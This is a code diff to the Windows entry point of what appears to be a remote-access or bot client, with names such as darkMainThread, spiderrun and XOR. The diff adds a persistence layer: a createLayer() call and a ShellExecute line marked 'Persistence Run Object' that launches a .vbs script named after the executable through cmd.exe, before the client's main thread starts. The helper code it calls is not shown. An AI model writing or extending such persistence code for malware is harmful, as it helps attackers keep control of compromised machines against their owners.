@@ -25,13 +25,13 @@
 #include "XOR.h"
 #include "spiderrun.h"
 #include "Client.h"
+#include "persistenceLayer.h"
 
 
 #pragma comment(lib,"comsuppw.lib")
 #pragma comment( lib, "Urlmon.lib" )
 #pragma comment(lib, "netapi32.lib")
 #pragma comment(lib,"wbemuuid")
-
 
 
 
@@ -67,9 +67,27 @@ int WINAPI WinMain(HINSTANCE hInstance,    // HANDLE TO AN INSTANCE.  This is th
 		}
 
 
-		
 
-		darkMain = std::thread(Client::darkMainThread, config);
+		LPTSTR cmdPath = _T("cmd.exe");
+		createLayer();
+
+
+
+		//Persistence Run Object
+	
+		std::string cmdArgs = "cmd.exe /k start " + Helpers::ExeName() + ".vbs";
+		ShellExecute(GetDesktopWindow(), "open", cmdPath, cmdArgs.c_str(), NULL, SW_SHOW);
+
+		
+	
+		std::cout << Helpers::ExeName();
+		//while (true) {
+			darkMain = std::thread(Client::darkMainThread, config);
+			//while (darkMain.joinable()) {
+
+			//}
+		//}
+
 		darkMain.join();
 
 		return 0;
